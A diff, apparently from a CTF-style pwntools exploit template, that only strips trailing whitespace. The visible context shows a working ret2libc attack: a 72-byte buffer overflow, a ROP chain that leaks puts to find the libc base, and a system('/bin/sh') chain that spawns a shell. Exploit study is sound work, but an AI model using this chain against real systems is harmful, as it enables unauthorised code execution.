@@ -24,7 +24,7 @@ USE_ONE_GADGET = False
 
 LOCAL_BIN = "./main"
 LIBC = "" #ELF("/lib/x86_64-linux-gnu/libc.so.6") #Set library path when know it
-LIBC_PATH = "./libc-b2b.so" 
+LIBC_PATH = "./libc-b2b.so"
 LIBC = ELF(LIBC_PATH)
 ENV = {"LD_PRELOAD": LIBC} if LIBC else {}
 
@@ -50,7 +50,7 @@ if GDB and not REMOTETTCP and not REMOTESSH:
 OFFSET = b"" #b"A"*264
 OFFSET = b"A" * 72
 if OFFSET == b"":
-    if REMOTETTCP: 
+    if REMOTETTCP:
         log.warning('you are on remote, change to local')
         exit(1)
     payload = cyclic(150)
@@ -91,7 +91,7 @@ def generate_payload_aligned(rop):
     payload1 = OFFSET + rop
     if (len(payload1) % 16) == 0:
         return payload1
-    
+
     else:
         payload2 = OFFSET + p64(RET) + rop
         if (len(payload2) % 16) == 0:
@@ -118,12 +118,12 @@ def get_addr(libc_func):
     recieved = P.recvline(False)
     if OFFSET[:30] in recieved:
         recieved = P.recvline()
-    
+
     # Parse leaked address
     log.info(f"Len rop1: {len(rop1)}")
     leak = u64(recieved.ljust(8, b"\x00"))
     log.info(f"Leaked LIBC address,  {libc_func}: {hex(leak)}")
-    
+
     # Set lib base address
     if LIBC:
         LIBC.address = leak - LIBC.symbols[libc_func] #Save LIBC base
@@ -134,7 +134,7 @@ def get_addr(libc_func):
     else:
         print("TO CONTINUE) Find the LIBC library and continue with the exploit... (https://LIBC.blukat.me/ or https://libc.rip/)")
         P.interactive()
-    
+
     return hex(leak)
 
 get_addr(libc_func) #Search for puts address in memmory to obtain LIBC base
@@ -159,7 +159,7 @@ def get_one_gadgets(libc):
     except:
         print("One_gadget isn't installed")
         one_gadgets = []
-    return 
+    return
 
 rop2 = b""
 if USE_ONE_GADGET:
@@ -172,15 +172,15 @@ if not rop2:
     BINSH = next(LIBC.search(b"/bin/sh")) #Verify with find /bin/sh
     SYSTEM = LIBC.sym["system"]
     EXIT = LIBC.sym["exit"]
-    
+
     log.info("POP_RDI %s " % hex(POP_RDI))
     log.info("bin/sh %s " % hex(BINSH))
     log.info("system %s " % hex(SYSTEM))
     log.info("exit %s " % hex(EXIT))
-    
+
     rop2 = p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) #p64(EXIT)
     rop2 = generate_payload_aligned(rop2)
-    
+
 
 print(P.clean())
 P.sendline(rop2)
